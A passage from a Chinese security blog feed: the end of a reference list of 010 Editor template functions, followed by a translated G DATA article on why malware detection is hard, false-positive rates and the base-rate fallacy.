</span><br><span class="line"><span class="keyword">char</span>[] FileNameGetExtension( <span class="keyword">const</span> <span class="keyword">char</span> path[] )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetExtensionW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[] )  </span><br><span class="line"><span class="keyword">char</span>[] FileNameGetPath( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">int</span> includeSlash=<span class="literal">true</span> )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetPathW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">int</span> includeSlash=<span class="literal">true</span> )  </span><br><span class="line"><span class="keyword">char</span>[] FileNameSetExtension( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">const</span> <span class="keyword">char</span> extension[] )   </span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameSetExtensionW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> extension[] )   </span><br><span class="line">  </span><br><span class="line"><span class="comment">//格式化字符串  </span></span><br><span class="line"><span class="keyword">int</span> SPrintf( <span class="keyword">char</span> buffer[], <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] )  </span><br><span class="line"><span class="keyword">int</span> SScanf( <span class="keyword">char</span> str[], <span class="keyword">char</span> format[], ... )</span><br></pre></td></tr></table></figure><p>工具函数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算校验和  </span></span><br><span class="line"><span class="built_in">int</span>64 Checksum( <span class="built_in">int</span> algorithm, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line">    CHECKSUM_BYTE CHECKSUM_SHORT_LE CHECKSUM_SHORT_BE CHECKSUM_INT_LE CHECKSUM_INT_BE CHECKSUM_INT64_LE CHECKSUM_INT64_BE CHECKSUM_SUM8 CHECKSUM_SUM16 CHECKSUM_SUM32 CHECKSUM_SUM64 CHECKSUM_CRC16 CHECKSUM_CRCCCITT CHECKSUM_CRC32 CHECKSUM_ADLER32  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgArrayStr( <span class="built_in">int</span> algorithm, char result[], uchar *buffer, <span class="built_in">int</span>64 size, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgArrayBytes( <span class="built_in">int</span> algorithm, uchar result[], uchar *buffer, <span class="built_in">int</span>64 size, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgStr( <span class="built_in">int</span> algorithm, char result[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> ChecksumAlgBytes( <span class="built_in">int</span> algorithm, uchar result[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, char ignore[]=<span class="string">""</span>, <span class="built_in">int</span>64 crcPolynomial=<span class="number">-1</span>, <span class="built_in">int</span>64 crcInitValue=<span class="number">-1</span> )  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//查找比较  </span></span><br><span class="line">TCompareResults Compare( <span class="built_in">int</span> type, <span class="built_in">int</span> fileNumA, <span class="built_in">int</span> fileNumB, <span class="built_in">int</span>64 startA=<span class="number">0</span>, <span class="built_in">int</span>64 sizeA=<span class="number">0</span>, <span class="built_in">int</span>64 startB=<span class="number">0</span>, <span class="built_in">int</span>64 sizeB=<span class="number">0</span>, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span>64 maxlookahead=<span class="number">10000</span>, <span class="built_in">int</span>64 minmatchlength=<span class="number">8</span>, <span class="built_in">int</span>64 quickmatch=<span class="number">512</span> )  </span><br><span class="line">    <span class="built_in">int</span> i, f1, f2;  </span><br><span class="line">    FileOpen( <span class="string">"C:\\temp\\test1"</span> );  </span><br><span class="line">    f1 = GetFileNum();  </span><br><span class="line">    FileOpen( <span class="string">"C:\\temp\\test2"</span> );  </span><br><span class="line">    f2 = GetFileNum();  </span><br><span class="line">    TCompareResults r = Compare( COMPARE_SYNCHRONIZE, f1, f2 );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Printf( <span class="string">"%d %Ld %Ld %Ld %Ld\n"</span>,  </span><br><span class="line">    r.record[i].type,  </span><br><span class="line">    r.record[i].startA,  </span><br><span class="line">    r.record[i].sizeA,  </span><br><span class="line">    r.record[i].startB,  </span><br><span class="line">    r.record[i].sizeB );  </span><br><span class="line">    &#125;  </span><br><span class="line">TFindResults FindAll( &lt;datatype&gt; data, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">    <span class="built_in">int</span> i;  </span><br><span class="line">    TFindResults r = FindAll( <span class="string">"Test"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%Ld %Ld\n"</span>, r.start[i], r.size[i] );  </span><br><span class="line"><span class="built_in">int</span>64 FindFirst( &lt;datatype&gt; data, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">TFindInFilesResults FindInFiles( &lt;datatype&gt; data, char dir[], char mask[], <span class="built_in">int</span> subdirs=<span class="literal">true</span>, <span class="built_in">int</span> openfiles=<span class="literal">false</span>, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )  </span><br><span class="line">    <span class="built_in">int</span> i, j;  </span><br><span class="line">    TFindInFilesResults r = FindInFiles( <span class="string">"PK"</span>,  </span><br><span class="line">    <span class="string">"C:\\temp"</span>, <span class="string">"*.zip"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Printf( <span class="string">" %s\n"</span>, r.file[i].filename );  </span><br><span class="line">    Printf( <span class="string">" %d\n"</span>, r.file[i].count );  </span><br><span class="line">    <span class="keyword">for</span>( j = <span class="number">0</span>; j &lt; r.file[i].count; j++ )  </span><br><span class="line">    Printf( <span class="string">" %Ld %Ld\n"</span>,  </span><br><span class="line">    r.file[i].start[j],  </span><br><span class="line">    r.file[i].size[j] );  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="built_in">int</span>64 FindNext( <span class="built_in">int</span> dir=<span class="number">1</span> )  </span><br><span class="line">TFindStringsResults FindStrings( <span class="built_in">int</span> minStringLength, <span class="built_in">int</span> type, <span class="built_in">int</span> matchingCharTypes, wstring customChars=<span class="string">""</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> requireNull=<span class="literal">false</span> )  </span><br><span class="line">    TFindStringsResults r = FindStrings( <span class="number">5</span>, FINDSTRING_ASCII,  </span><br><span class="line">    FINDSTRING_LETTERS | FINDSTRING_CUSTOM, <span class="string">"$&amp;"</span> );  </span><br><span class="line">    Printf( <span class="string">"%d\n"</span>, r.count );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; r.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%Ld %Ld %d\n"</span>, r.start[i], r.size[i], r.type[i] );  </span><br><span class="line">      </span><br><span class="line"><span class="comment">//类型转换  </span></span><br><span class="line">char ConvertASCIIToEBCDIC( char ascii )  </span><br><span class="line"><span class="built_in">void</span> ConvertASCIIToUNICODE( <span class="built_in">int</span> len, <span class="keyword">const</span> char ascii[], ubyte unicode[], <span class="built_in">int</span> bigendian=<span class="literal">false</span> )  </span><br><span class="line"><span class="built_in">void</span> ConvertASCIIToUNICODEW( <span class="built_in">int</span> len, <span class="keyword">const</span> char ascii[], ushort unicode[] )   </span><br><span class="line">char ConvertEBCDICToASCII( char ebcdic )  </span><br><span class="line"><span class="built_in">void</span> ConvertUNICODEToASCII( <span class="built_in">int</span> len, <span class="keyword">const</span> ubyte unicode[], char ascii[], <span class="built_in">int</span> bigendian=<span class="literal">false</span> )  </span><br><span class="line"><span class="built_in">void</span> ConvertUNICODEToASCIIW( <span class="built_in">int</span> len, <span class="keyword">const</span> ushort unicode[], char ascii[] )  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int</span> ExportFile( <span class="built_in">int</span> type, char filename[], <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span>64 startaddress=<span class="number">0</span>,<span class="built_in">int</span> bytesperrow=<span class="number">16</span>, <span class="built_in">int</span> wordaddresses=<span class="number">0</span> )  </span><br><span class="line"><span class="built_in">int</span> ImportFile( <span class="built_in">int</span> type, char filename[], <span class="built_in">int</span> wordaddresses=<span class="literal">false</span>, <span class="built_in">int</span> defaultByteValue=<span class="number">-1</span> )  </span><br><span class="line"><span class="built_in">int</span> GetSectorSize()   </span><br><span class="line"><span class="built_in">int</span> HexOperation( <span class="built_in">int</span> operation, <span class="built_in">int</span>64 start, <span class="built_in">int</span>64 size, operand, step=<span class="number">0</span>, <span class="built_in">int</span>64 skip=<span class="number">0</span> )  </span><br><span class="line"><span class="built_in">int</span>64 Histogram( <span class="built_in">int</span>64 start, <span class="built_in">int</span>64 size, <span class="built_in">int</span>64 result[<span class="number">256</span>] )  </span><br><span class="line"><span class="built_in">int</span> IsDrive()  </span><br><span class="line"><span class="built_in">int</span> IsLogicalDrive()  </span><br><span class="line"><span class="built_in">int</span> IsPhysicalDrive()  </span><br><span class="line"><span class="built_in">int</span> IsProcess()  </span><br><span class="line"><span class="built_in">int</span> OpenLogicalDrive( char driveletter )  </span><br><span class="line"><span class="built_in">int</span> OpenPhysicalDrive( <span class="built_in">int</span> physicalID )  </span><br><span class="line"><span class="built_in">int</span> OpenProcessById( <span class="built_in">int</span> processID, <span class="built_in">int</span> openwriteable=<span class="literal">true</span> )  </span><br><span class="line"><span class="built_in">int</span> OpenProcessByName( char processname[], <span class="built_in">int</span> openwriteable=<span class="literal">true</span> )  </span><br><span class="line"><span class="built_in">int</span> ReplaceAll( &lt;datatype&gt; finddata, &lt;datatype&gt; replacedata, <span class="built_in">int</span> matchcase=<span class="literal">true</span>, <span class="built_in">int</span> wholeword=<span class="literal">false</span>, <span class="built_in">int</span> method=<span class="number">0</span>, <span class="built_in">double</span> tolerance=<span class="number">0.0</span>, <span class="built_in">int</span> dir=<span class="number">1</span>, <span class="built_in">int</span>64 start=<span class="number">0</span>, <span class="built_in">int</span>64 size=<span class="number">0</span>, <span class="built_in">int</span> padwithzeros=<span class="literal">false</span>, <span class="built_in">int</span> wildcardMatchLength=<span class="number">24</span> )</span><br></pre></td></tr></table></figure><p>特别需要注意的是以下几个函数，对于解析偏移后的动态数据它们是不可或缺的：</p><p>FEof 判断当前读取位置是否在文件末尾<br>FTell 返回文件的当前读取位置<br>FSeek 将当前读取位置设置为指定地址<br>FSkip 将当前读取位置向前移动多个字节</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;010editor-模板编写&quot;&gt;&lt;a href=&quot;#010editor-模板编写&quot; class=&quot;headerlink&quot; title=&quot;010editor 模板编写&quot;&gt;&lt;/a&gt;010editor 模板编写&lt;/h1&gt;&lt;p&gt;参考文档：&lt;br&gt;&lt;a href=&quot;https://www.sweetscape.com/010editor/manual/IntroTemplates.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sweetscape.com/010editor/manual/IntroTemplates.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-257797.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-257797.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://lyana-nullptr.github.io/2024/07/27/try-the-template-of-010editor/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; class=&quot;headerlink&quot; title=&quot;变量&quot;&gt;&lt;/a&gt;变量&lt;/h2&gt;&lt;p&gt;模板文件的开头会有如下信息：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;      &lt;span class=&quot;attr&quot;&gt;File:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;Authors:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;Version:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;Purpose:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;  &lt;span class=&quot;attr&quot;&gt;Category:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;WeChat&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;File Mask:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;*.wxapkg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;  &lt;span class=&quot;attr&quot;&gt;ID Bytes:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;BE,&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;4D&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;4D&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;History:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序会优先用File Mask匹配文件扩展名，再用ID Bytes匹配魔术数，匹配成功的话就会自动加载模板文件。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="blue &amp; red" scheme="http://blog.wonderkun.cc/tags/blue-red/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码难以检测的真正原因</title>
    <link href="http://blog.wonderkun.cc/2023/10/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%9A%BE%E4%BB%A5%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0/"/>
    <id>http://blog.wonderkun.cc/2023/10/10/恶意代码难以检测的真正原因/</id>
    <published>2023-10-10T08:16:34.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文地址: <a href="https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard" target="_blank" rel="noopener">https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>科研人员开发的人工智能检测引擎具有98% 的恶意软件检测率和5% 的假阳性率。如果您认为这是一种非常好的防病毒软件技术，那么本文可能会改变您的想法。</p><a id="more"></a><h2 id="恶意软件检测不能被彻底解决，但是并不是不切实际的"><a href="#恶意软件检测不能被彻底解决，但是并不是不切实际的" class="headerlink" title="恶意软件检测不能被彻底解决，但是并不是不切实际的"></a>恶意软件检测不能被彻底解决，但是并不是不切实际的</h2><p><a href="https://web.eecs.umich.edu/~aprakash/eecs588/handouts/cohen-viruses.html" target="_blank" rel="noopener">Fred Cohen</a> 在 1984 年已经证明了病毒检测是一个不可解问题。他假设存在一个完美的病毒检测程序是存在的，然后他构造了一个潜在的病毒，它仅在完美的检测程序认为它是干净的时才有感染性，所以这个完美的检测程序不能提供正确的检测结果，所以这个并不是一个完美的病毒检测程序。由于所有病毒都是恶意软件，因此可以为恶意软件检测构造类似的反证法证明这个完美的恶意代码检测程序是不存在的。</p><p>但是，在数学意义上的”不可解”并不意味着它没有实际的解决方案。一个不可解问题是不能在所有情况下提供正确的答案的决策问题。因此，如果您有一个程序，可以正确回答 99.9999% 的情况，但是 0.0001% 的情况回答错误，那么这个问题可能同时是不可解的和仍然实际可行的。我们已经有足够的解决方案来解决类似的问题。一个例子是<a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem" target="_blank" rel="noopener">旅行商</a>问题，它在物流的包裹路由系统或电路制造过程中具有应用。尽管尚未发现任何可以在合理时间内解决旅行商问题的算法（它是 NP-hard），但有足够的近似解决方案来计算包裹递送的路线。</p><p>同样适用于防病毒产品，它们尽可能最好地保护系统免受恶意软件的攻击。但是与包裹收件人不同，恶意软件开发人员正在积极试图以使防病毒产品做错决策并不检测这些程序的方式创建恶意软件。这类似于人们故意和不断试图找到包裹交付路由输入，这些输入在合理时间内没有得到最佳解决。</p><p>因此，恶意软件检测具有困难的本质，并需要不断的工作和改进以保持有用。然而，防病毒程序因被视为过时的、不灵活的而被诟病。事实真的是这样吗？</p><h2 id="有人说他们可以做的更好"><a href="#有人说他们可以做的更好" class="headerlink" title="有人说他们可以做的更好"></a>有人说他们可以做的更好</h2><p>从媒体和广告商的常见声明中，人们得出的印象是防病毒产品故意使用过时的技术，并拒绝利用已经研究过的那些新的人工智能和其他技术来建立他们的系统。我们经常看到像”传统的防病毒已经死了”和”这个人工智能比防病毒更好”这样的文章吗？</p><p>这引出了一个问题：如果防病毒产品很容易就能更好，为什么它们不适应新技术呢？事实是：</p><ol><li>他们的确这么做了；</li><li>它们不能承受误报，并且与可以承受误报的应用程序进行了不公平的比较。</li></ol><h3 id="谬论1-防病毒产品使用过时的技术"><a href="#谬论1-防病毒产品使用过时的技术" class="headerlink" title="谬论1: 防病毒产品使用过时的技术"></a>谬论1: 防病毒产品使用过时的技术</h3><p>据媒体报道，防病毒产品搜索文件中的特征码以及将文件哈希值与阻止列表进行比较这样的技术进行检测恶意代码。这些检测机制仍然存在，但防病毒产品已经使用其他恶意软件检测技术至少20年了。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202302032033175.png" alt=""></p><p>2021 年的文章声称，防毒软件仅仅依赖于病毒签名来检测已知威胁。但是这是错误的：防毒软件不仅仅依赖于病毒签名，并且病毒签名不仅仅可以检测已知的恶意软件。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202302032036677.png" alt=""></p><p>有文章声称下一代的解决方案比当前的杀软更好。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202302032038303.png" alt=""></p><p>这篇文章错误地假设签名仅检测已知的恶意软件，可能是因为他将签名与基于模式的检测方法等效。</p><p>当我对恶意软件分析产生兴趣时，我读到的第一本关于这个主题的书是Péter Szőr的《The Art of Computer Virus Research and Defense》（2005年）[szor05]。这本现在已经有17年历史的书描述了远远超出模式签名和散列值的方法。Szőr提到了仿真，X射线扫描，内存扫描，基于算法的签名，行为阻止器和网络扫描[szor05]等。这些技术在过去几年中得到了改进，并开发了新的技术。</p><p>人工智能（AI）技术在Szőr的书中没有提到，但该技术已经有一些年头了。它们服务于许多目的，包括恶意软件聚类，客户端系统上的恶意软件检测以及自动签名创建。GDATA的DeepRay从2018年开始，我们当然不是第一家使用AI来增强检测能力的AV制造商。</p><p>尽管有了所有这些进展，这个谬论仍然存在。我可以想到两个原因：</p><p>首先，安全产品营销积极地强化它，以给人一种广告产品是新的、更好的印象。NextGen防病毒产品就是这样一个例子。他们声称拥有新的、不同的检测和保护技术，但他们使用的是与存在时间更长的防病毒产品相同的技术。反恶意软件和防病毒软件之间的人为区分也在尝试着同样的做法，给人一种（错误的）印象，即防病毒产品无法抵御恶意软件。</p><p>第二，其次，人们尝试检测VirusTotal，认为那里使用的扫描引擎反映了真实的防病毒产品。如果他们对检测到的文件进行了微小的更改，从而降低了VirusTotal的检测率，那么他们认为自己可以成功地规避防病毒产品。这种测试策略是有缺陷的，因为VirusTotal上的扫描引擎只支持真正产品所具有的一小部分功能，而且实际上大部分都局限于模式扫描和文件块列表，从而让人们对完整产品的实际工作方式产生错觉。VirusTotal的网站上也有说明（见下图）。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202302032053412.png" alt=""></p><h3 id="谬论2-5-的误报率是可用的"><a href="#谬论2-5-的误报率是可用的" class="headerlink" title="谬论2:  5%的误报率是可用的"></a>谬论2:  5%的误报率是可用的</h3><p>当我在2014年写我的硕士论文时，我开发了一种基于文件异常的恶意软件检测启发式方法。我的工作基于Ange Albertini的贡献，即发现和记录文件异常，他将这些文件异常收集在他的项目Corkami中。当时作为Avira的恶意软件分析师工作的Ange，得知我的工作后来参加了我在莱比锡的硕士论文答辩。当我问他，我的启发式方法的误报率是多少是可用的时，他的回答让我吃惊。他说，零。</p><p>“零”是一个糟糕的答案，因为一旦我试图使假阳性率接近于零，检测率就会急剧下降。误报率实际上从未达到零。我对我的测试使用了49,814个干净样本和103,275个恶意样本。图片在右侧显示了误报（十字形）和真阳性（黑色正方形）率的图表。例如，在8.81％的误报率下，真阳性检测率为98.47％。这意味着8.81％的干净文件被错误地认为是恶意软件，而1.53％的恶意软件不能被检测到。即使将误报率保持尽可能低，仍有0.17％的干净文件得到了错误的判决。这样带来了巨大的弊端，导致恶意文件的检出率降低37.80％。</p><p><img src="https://pic.wonderkun.cc//uploads/note/202302032106621.png" alt=""></p><p>当时我并未意识到为什么误报率必须是零，当然，一定的错误率是可以接受的？防病毒产品毕竟不是完美的。每个人都听说过甚至可能遇到过防病毒产品的误报。现在我是一名恶意软件分析师，我知道了答案：是的，假阳性是防病毒产品的一部分，但可接受的假阳性率远低于你的想象。</p><p>当前的恶意软件检测研究论文通常对可接受的假阳性率有相同的误解。他们中的许多人认为，干净文件和恶意软件文件的数量大致相等，也就是说是平衡的。实际上，计算机系统很少看到任何恶意软件，但大部分时间都会处理干净的文件。例如：对于Windows 10 <em>C:\Windows</em>文件夹包含大约500000个文件。如果我们假设只有5%的假阳性率，检测技术将确定25000个文件为恶意文件。除非您准备好打赌，在从<em>C:/Windows</em>中删除25000个任意文件后，您的系统仍能正常工作，否则这是一个不可接受的数字。您准备下注多少文件？</p><p>这种对不平衡问题的误解有一个名字：<strong>基本利率谬误</strong>。这是如此普遍，以至于进行了几项研究以提高认识。Jan Brabec和Lukas Machlica总结道：“我们遇到了大量的近期论文，其中使用了不恰当的评估方法”和<em>“糟糕的做法可能会使结果严重偏向于不恰当的算法”</em>。研究《计算机安全中机器学习的注意事项》在十年中发表的30篇论文中检查了常见的陷阱。这些论文中有11篇受到了基本利率谬误的困扰。</p><p>然而，可以接受的误报率率到底是多少？Stefan Axelsson就侵检测的这场景下分析了这个问题。Axelsson表示<em>“限制入侵检测系统性能的因素不是将行为正确识别为入侵行为的能力，而是其抑制错误警报的能力”，并得出结论</em>“入侵检测系统每次事件的误报率必须低于1/100,000，即0.001%。误报率更高的解决方案不仅为负责安全的运维人员带来了更多的工作，而且还变成了“狼来了谎言”——没人再把它们当回事了。</p><p>一个可行的误报率对于能够自动响应入侵威胁的防病毒产品来说必须更低。与入侵检测系统相反，自动预防中的误报可以摧毁整个系统或中断生产流程。对于使用小于100,000个样本的干净样本集的研究工作，误报率实际上必须为零。</p><h2 id="防病毒产品是怎么做的"><a href="#防病毒产品是怎么做的" class="headerlink" title="防病毒产品是怎么做的"></a>防病毒产品是怎么做的</h2><p>现在，我们知道一个防病毒程序的误报率必须多么低才能保持可用，显然这就是为什么启发式检测不再那么简单。很多人可以想到启发式检测的思路，例如，为了检测勒索软件，只需要检查一次性重命名大量文件并因加密而提高熵值的程序。但是当这些启发式被实际应用时，你会发现有多少合法程序显示出类似的行为。以勒索软件启发式为例，例如，备份程序也做着相同的事情：批量重命名个人文件并通过压缩提高它们的熵值。</p><p>防病毒产品通过分层防御机制来解决这个问题，各种检测手段堆叠在一起以实现最佳覆盖。它们中的一些可能只能检测20％的样本，因为它们特定于某些类型的攻击或环境，例如，文件格式，行为或其他是先决条件的属性。但是，如果某些样本在其他层并没有被检测到，那么当前层依然会进行检测和处理。</p><p>大多数人可能都熟悉<a href="https://en.wikipedia.org/wiki/Swiss_cheese_model" target="_blank" 